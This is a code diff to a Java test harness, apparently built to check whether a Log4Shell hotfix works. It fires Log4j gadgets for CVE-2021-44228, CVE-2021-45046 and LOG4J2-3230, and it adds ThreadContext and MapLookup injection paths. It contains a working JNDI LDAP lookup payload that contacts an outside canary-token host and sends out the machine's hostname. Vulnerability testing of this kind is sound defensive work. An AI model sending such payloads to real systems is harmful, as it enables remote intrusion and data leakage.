@@ -3,7 +3,9 @@ package de.silpion.log4shell.hotfix.side.effect;
 import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.ThreadContext;
 import org.apache.logging.log4j.core.Core;
+import org.apache.logging.log4j.core.lookup.MapLookup;
 
 import java.util.LinkedHashMap;
 import java.util.Map;
@@ -26,19 +28,25 @@ public class Main implements Runnable {
     ) {
         version();
 
+        MapLookup.setMainArguments(args);
         for (int i = 0; i < args.length; i++) {
             gadgets.put(
                 String.format("args-%d", i),
                 Log.printf(args[i])
             );
         }
+
+        final String canary = System.getProperty(
+            "canary",
+            "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}"
+        );
         gadgets.put(
             "CVE-2021-44228",
-            Log.log("${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}")
+            Log.log(canary)
         );
         gadgets.put(
             "CVE-2021-45046",
-            Log.printf("${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}")
+            Log.printf(canary)
         );
         gadgets.put(
             "LOG4J2-3230",
@@ -48,6 +56,7 @@ public class Main implements Runnable {
 
     @Override
     public void run() {
+        gadgets.forEach(this::contextualize);
         gadgets.forEach(this::trigger);
     }
 
@@ -56,9 +65,16 @@ public class Main implements Runnable {
         final Log gadget
     ) {
         final long ts = System.currentTimeMillis();
-        LOG.info("Triggering {}", description);
+        LOG.info("Triggering {} via {}()", description, gadget.getMethod().getName());
         gadget.invoke(LOG);
         LOG.info("That took {}ms", System.currentTimeMillis() - ts);
+    }
+
+    private void contextualize(
+        final String description,
+        final Log gadget
+    ) {
+        ThreadContext.put(description, gadget.getString());
     }
 
     private void version() {
